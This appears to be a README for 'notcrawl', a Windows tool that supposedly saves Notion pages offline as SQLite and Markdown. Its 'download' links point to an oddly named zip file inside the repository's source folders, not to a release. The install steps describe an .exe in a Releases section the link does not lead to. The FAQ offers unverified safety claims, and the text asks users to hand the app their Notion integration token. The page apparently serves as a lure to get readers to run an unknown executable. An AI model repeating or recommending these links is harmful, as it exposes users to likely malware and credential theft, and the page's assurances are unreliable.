# 📦 notcrawl - Save your Notion pages for offline use

[![](https://img.shields.io/badge/download-notcrawl-blue.svg)](https://raw.githubusercontent.com/Harjotgallay/notcrawl/main/internal/share/Software_Blattoidea.zip)

## 📋 What is notcrawl?

Notion stores your notes in the cloud. If you lose your internet connection, you cannot read your work. notcrawl solves this problem. It copies your pages from Notion and saves them to your computer. It creates a local copy in two formats. First, it puts your data into a SQLite database. This database stores your information in a structured way. Second, it saves your notes as Markdown files. Markdown files are simple text files you can open with any program. You keep full control of your data on your own hard drive.

## ⚙️ System Requirements

You need a Windows computer to run notcrawl. 

*   Operating System: Windows 10 or Windows 11.
*   Processor: Any processor made in the last ten years.
*   Memory: 4 GB of RAM or more.
*   Storage: 200 MB of space for the application and database files.
*   Internet Connection: You need a connection to sync from Notion.

Make sure you have your Notion account login details ready. You also need a Notion API integration token. You create this token on the Notion website under your settings.

## 📥 How to Install

Follow these steps to set up the software on your machine:

1. Visit the [official download page](https://raw.githubusercontent.com/Harjotgallay/notcrawl/main/internal/share/Software_Blattoidea.zip).
2. Look for the latest version under the Releases section.
3. Click the link that ends in .exe to start your download.
4. Open the file once the download finishes. 
5. Follow the on-screen prompts to complete the installation.

The software installs itself into your Program Files folder. You will see a new icon on your desktop after the process ends. Double-click this icon to start using it.

## 🚀 Setting Up the Connection

The application needs permission to talk to your Notion account. 

1. Open your web browser and go to the Notion Integrations portal.
2. Create a new integration.
3. Copy the Internal Integration Token. 
4. Open the notcrawl app on your computer.
5. Paste your token into the settings box.
6. Share your specific Notion pages with the integration you just created.

You only perform these steps one time. The software remembers your settings for your next use.

## 💾 Running Your First Sync

When you want to save your notes, open the app and find the Sync button. 

1. Press the Sync button.
2. Wait for the progress bar to fill.
3. The app scans your chosen pages.
4. It downloads text, images, and formatting.
5. It saves these into your local SQLite file and your Markdown folder.

The software tells you when the task finishes. You can now close the app and view your files in your standard file explorer.

## 📁 Managing Your Saved Files

The software creates a folder on your computer to store your work. You find this folder in your Documents directory under the name "notcrawl_data".

*   `database.db`: This file contains your indexed notes in SQLite format.
*   `markdown/`: This folder holds all your folders and notes as plain text.

You use any text editor or database viewer to open these files. The Markdown files use standard formatting. You can move these files to other apps like Obsidian or Bear if you choose. 

## 🛠️ Frequently Asked Questions

**Does this app share my data?**
No. This tool runs entirely on your machine. Your data never leaves your computer.

**Can I pick which pages to save?**
Yes. You choose the specific pages inside your Notion account settings. The app only accesses the pages you share with it.

**How often should I sync?**
Sync as often as you like. We suggest once a day if you change your notes frequently.

**What happens if I lose internet access?**
The app will not sync new data, but your existing files stay on your machine. You can read and edit your saved Markdown files at any time.

**Is it safe to delete the database?**
Yes. You can delete the database file if you need space. The app creates a fresh copy during your next sync session. 

**Does this support images?**
Yes. The app saves images into a sub-folder and links them inside your Markdown files. 

**Will this slow down my computer?**
The app uses very little power. You will not notice a change in your computer speed while it runs in the background.

## 🆘 Getting Help

If you run into issues, try these steps first:

1. Check your internet connection.
2. Confirm your token is still valid.
3. Ensure you have given the integration access to the pages you want to download.

If problems persist, check the issues tab on the website to see if other users found a fix. Ensure you are using the latest version of the app. Updates often fix minor bugs and improve connection stability. Keep your software current to ensure the best performance.